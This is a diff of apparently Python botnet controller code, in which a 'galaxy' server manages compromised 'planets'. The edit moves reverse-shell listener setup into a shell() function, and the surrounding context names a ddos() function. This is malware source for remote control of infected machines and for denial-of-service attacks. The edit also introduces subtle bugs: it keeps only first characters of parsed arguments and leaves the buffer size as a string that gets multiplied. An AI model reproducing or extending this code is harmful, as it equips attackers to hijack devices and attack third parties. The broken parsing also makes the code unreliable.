@@ -46,17 +46,13 @@ def clear():
 
 def bind_port():
     """Bind to a specified port and begin listening for connections."""
-    global galaxy_online, shell_socket, galaxy_socket
+    global galaxy_online, galaxy_socket
     while not galaxy_online:
         try:
             galaxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            shell_socket = socket.socket()
             galaxy_socket.bind(("0.0.0.0", galaxy_port))
-            shell_socket.bind(("0.0.0.0", shell_port))
             galaxy_socket.listen()
-            shell_socket.listen()
             galaxy_socket.settimeout(0.5)
-            shell_socket.settimeout(0.5)
             galaxy_online = True
         except OSError as e:
             if str(e) == "[Errno 98] Address already in use":
@@ -173,22 +169,22 @@ def ddos(cmd_ddos):
 
 def shell(cmd_shell):
     """Establish a reverse shell with a remote device."""
+    shell_socket = socket.socket()
+    shell_socket.bind(("0.0.0.0", shell_port))
+    shell_socket.listen()
+    shell_socket.settimeout(0.5)
     shell_buf_size = 128
     new_cmd = cmd_shell.replace("shell ", "").strip().split()
     if len(new_cmd) == 1:
-        shelled_planet_id = new_cmd
+        shelled_planet_id = new_cmd[0]
     else:
         shelled_planet_id, shell_buf_size = new_cmd
-    shelled_planet_id = (
-        str(shelled_planet_id).replace("['", "").replace("']", "").strip()
-    )
+        shell_buf_size = shell_buf_size[0]
+        shelled_planet_id = shelled_planet_id[0]
     if shelled_planet_id not in planet_ids:
         print("| ERROR: The planet ID specified does not exist.")
         shell_socket.close()
         return
-    shell_buf_size = int(
-        str(shell_buf_size).replace("['", "").replace("']", "").strip()
-    )
     shelled_planet = planets[int(planet_ids.index(shelled_planet_id))]
     shell_buf_size = shell_buf_size * 1024
     shelled_planet.send(f"shellcmd start bufsize {shell_buf_size}".encode())
@@ -199,6 +195,7 @@ def shell(cmd_shell):
             break
         except OSError as e:
             if "Bad file descriptor" in str(e):
+                shell_socket.close()
                 return
             else:
                 raise e
@@ -246,7 +243,6 @@ signal(SIGINT, exit_handler)
 galaxy_port = 9999
 galaxy_socket = ""
 shell_port = 10000
-shell_socket = ""
 planets = []
 planet_ips: list[tuple]
 planet_ips = []
